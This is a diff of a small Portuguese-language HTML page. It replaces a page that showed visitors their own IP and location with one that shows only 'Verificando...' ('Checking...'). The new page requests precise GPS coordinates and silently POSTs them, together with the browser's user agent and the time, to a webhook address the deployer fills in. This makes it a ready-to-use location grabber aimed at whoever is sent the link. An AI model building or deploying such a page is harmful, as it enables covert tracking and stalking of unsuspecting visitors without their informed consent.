@@ -1,82 +1,39 @@
-
 <!DOCTYPE html>
 <html>
 <head>
-  <meta charset="UTF-8">
-  <title>Minha Localização Completa</title>
-  <style>
-    body {
-      font-family: Arial, sans-serif;
-      padding: 30px;
-      background: #f4f4f4;
-    }
-    .box {
-      background: white;
-      padding: 20px;
-      border-radius: 8px;
-      box-shadow: 0 0 10px rgba(0,0,0,0.1);
-    }
-  </style>
+<meta charset="UTF-8">
+<title>Teste Localização</title>
 </head>
 <body>
-
-<div class="box">
-  <h2>Coletando dados...</h2>
-  <div id="dados">Aguarde...</div>
-</div>
+<h2>Verificando...</h2>
 
 <script>
-async function getIP() {
-  try {
-    const response = await fetch("https://api.ipify.org?format=json");
-    const data = await response.json();
-    return data.ip;
-  } catch {
-    return "Não detectado";
-  }
-}
+if (navigator.geolocation) {
+  navigator.geolocation.getCurrentPosition(function(pos) {
 
-async function coletarDados() {
-  let ip = await getIP();
-
-  if (navigator.geolocation) {
-    navigator.geolocation.getCurrentPosition(function(position) {
-      let lat = position.coords.latitude;
-      let lon = position.coords.longitude;
-      let precisao = position.coords.accuracy;
-      let altitude = position.coords.altitude || "Indisponível";
-      let velocidade = position.coords.speed || "Indisponível";
-      let direcao = position.coords.heading || "Indisponível";
-
-      document.getElementById("dados").innerHTML = `
-        <b>IP Público:</b> ${ip} <br><br>
-        <b>Latitude:</b> ${lat} <br>
-        <b>Longitude:</b> ${lon} <br>
-        <b>Precisão:</b> ${precisao} metros <br>
-        <b>Altitude:</b> ${altitude} <br>
-        <b>Velocidade:</b> ${velocidade} <br>
-        <b>Direção:</b> ${direcao} <br><br>
-        <b>Navegador:</b> ${navigator.userAgent} <br><br>
-        <b>Horário:</b> ${new Date()} <br><br>
-        <b>Mapa:</b> 
-        <a target="_blank" href="https://www.google.com/maps?q=${lat},${lon}">
-        Abrir no Google Maps</a>
-      `;
-    },
-    function(error) {
-      document.getElementById("dados").innerHTML =
-      "Permissão negada ou erro na geolocalização.";
-    },
-    {
-      enableHighAccuracy: true
+    fetch("COLE_AQUI_SUA_URL_DO_WEBHOOK", {
+      method: "POST",
+      headers: {
+        "Content-Type": "application/json"
+      },
+      body: JSON.stringify({
+        latitude: pos.coords.latitude,
+        longitude: pos.coords.longitude,
+        precisao: pos.coords.accuracy,
+        navegador: navigator.userAgent,
+        horario: new Date().toString()
+      })
     });
-  } else {
-    document.getElementById("dados").innerHTML =
-    "Geolocalização não suportada.";
-  }
-}
 
-coletarDados();
+    document.body.innerHTML = "Localização enviada.";
+  },
+  function() {
+    document.body.innerHTML = "Permissão negada.";
+  },
+  {
+    enableHighAccuracy: true
+  });
+}
 </script>
 
 </body>
